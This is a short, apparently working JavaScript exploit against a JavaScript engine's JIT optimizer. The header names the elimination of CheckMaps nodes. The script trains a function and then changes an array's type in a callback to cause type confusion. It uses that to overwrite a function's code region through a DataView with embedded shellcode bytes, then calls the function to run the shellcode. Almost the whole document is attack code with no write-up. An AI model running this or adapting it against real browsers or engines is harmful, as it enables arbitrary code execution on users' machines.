checkMaps Optimize -> CheckMaps Node eliminations


let ab = new ArrayBuffer(8);
let farray = new Float64Array(ab);
let uarray = new Uint32Array(ab);
let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];

function f2i(f) {
		farray[0] = f;
		return [uarray[0],uarray[1]]
}

function i2f(lo,hi) {
		uarray[0] = lo;
		uarray[1] = hi;
		return farray[0];
}

function hex(lo,hi) {
		console.log('0x' + hi.toString(16) + lo.toString(16));
}

function bug(x,cb, i,j) {
    // The check is added here, if it is a packed type as expected it passes
    let a = x[0];
    // Hit our call back, change type
    cb();
    // Access data as the wrong type of map
    
    // Write one offset into the other    
    let c = x[i];
    x[j] = c;
    return c;
}

function sleep() {
	while(1) { continue; }
}

let x = [1.1,1.2,1.3];
let y = new Array(2);
let fun = function() {
	x[100000] = 1;
	var t_fun = function() { //35
		return 1;
	}
	var ab = new ArrayBuffer(200); //bs - 40
	y[0] = ab;
	y[1] = t_fun;
}


for (var i = 0; i < 10000; i++) 
	var o = bug(x,function(){}, 1,1);
bug(x, fun,35,40); 
let dv = new DataView(y[0]);
for(let i = 0; i < shellcode.length; i++)
	dv.setUint32((i*4)+0x60,shellcode[i],true);
y[1]();
